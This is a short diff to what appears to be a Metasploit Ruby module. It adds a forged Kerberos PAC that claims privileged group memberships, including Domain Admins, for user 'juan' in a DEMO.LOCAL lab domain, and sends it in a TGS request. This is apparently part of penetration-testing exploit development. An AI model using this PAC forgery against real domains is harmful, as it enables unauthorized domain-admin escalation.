@@ -63,6 +63,15 @@ class Metasploit4 < Msf::Auxiliary
     ticket = res.ticket
 
     print_status("Sending TGS-REQ...")
+
+    pac = build_pac(
+      client_name: 'juan',
+      group_ids: [513, 512, 520, 518, 519],
+      domain_id: 'S-1-5-21-1755879683-3641577184-3486455962',
+      realm: 'DEMO.LOCAL',
+      logon_time: logon_time,
+    )
+
     res = send_request_tgs(
       client_name: 'juan',
       server_name: 'krbtgt/DEMO.LOCAL',
@@ -72,7 +81,8 @@ class Metasploit4 < Msf::Auxiliary
       session_key: session_key,
       ticket: ticket,
       group_ids: [513, 512, 520, 518, 519],
-      domain_id: 'S-1-5-21-1755879683-3641577184-3486455962'
+      domain_id: 'S-1-5-21-1755879683-3641577184-3486455962',
+      pac: pac.encode
     )
 
     unless res.msg_type == 13
